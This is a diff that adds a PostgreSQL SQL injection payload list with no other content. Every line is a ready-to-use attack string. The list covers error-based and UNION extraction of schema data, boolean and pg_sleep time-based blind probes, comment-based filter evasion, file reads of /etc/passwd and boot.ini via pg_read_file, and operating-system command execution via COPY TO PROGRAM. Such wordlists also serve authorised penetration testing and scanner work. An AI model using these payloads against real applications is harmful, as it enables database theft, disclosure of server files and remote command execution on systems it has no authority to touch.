@@ -1,0 +1,16 @@
+' AND 1=CAST((SELECT version()) AS INTEGER)-- -
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)-- -
+' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS INTEGER)-- -
+' AND SUBSTRING(version(),1,1)='P'-- -
+' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='u'-- -
+'; SELECT pg_sleep(5)-- -
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+' UNION SELECT NULL, NULL-- -
+' UNION SELECT table_name, NULL FROM information_schema.tables-- -
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
+'/**/UNION/**/SELECT/**/NULL,NULL-- -
+' UNION SELECT CHR(97)||CHR(98)||CHR(99), NULL-- -
+' UNION SELECT pg_read_file('C:\\boot.ini'), NULL-- -
+' UNION SELECT pg_read_file('/etc/passwd'), NULL-- -
+'; COPY (SELECT '') TO PROGRAM 'whoami'-- -
+'; COPY (SELECT '') TO PROGRAM 'ls'-- -
